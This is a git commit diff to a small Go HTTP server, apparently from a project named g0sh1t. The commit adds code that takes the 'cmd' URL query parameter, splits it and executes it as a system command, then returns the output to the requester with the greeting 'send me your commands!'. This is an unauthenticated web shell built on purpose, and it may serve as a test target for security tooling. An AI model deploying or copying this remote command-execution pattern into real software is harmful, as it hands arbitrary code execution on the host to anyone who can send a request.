dee65718b87a0e4d2ceced9a2c1c12f2a64eaddc
cody <cody@signalsciences.com>
2018-05-02 07:38:51 -0700

    moved runner function

--- server.go
+++ server.go
@@ -1,19 +1,43 @@
 package main
 
 import (
-	"io"
+	"bytes"
+	"fmt"
+	"log"
 	"net/http"
-	runner 
+	"net/url"
+	"os/exec"
+	"strings"
+
+	runner "github.com/sprkyco/g0sh1t/runner"
 )
+
+func Run(cmd string) string {
+	var out bytes.Buffer
+	unescaped, _ := url.QueryUnescape(cmd)
+	commands := strings.Split(unescaped, " ")
+	command := string(commands[0])
+	args := append(commands[:0], commands[1:]...)
+
+	c := exec.Command(command, args...)
+	c.Stdout = &out
+	err := c.Run()
+	if err != nil {
+		log.Fatal(err)
+	}
+	//	fmt.Printf("out: %q\n", out.String())
+	return out.String()
+}
 
 func main() {
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		cmd, ok := r.URL.Query()["cmd"]
+		cmd := r.URL.Query().Get("cmd")
 
-		if !ok || len(cmd) < 1 {
-			io.WriteString(w, "Hello world!")
+		if len(cmd) < 1 {
+			fmt.Fprintf(w, "Hello world, send me your commands!")
 		} else {
 			output := runner.Run(cmd)
+			fmt.Fprintf(w, "Results: %s", output)
 		}
 
 	})
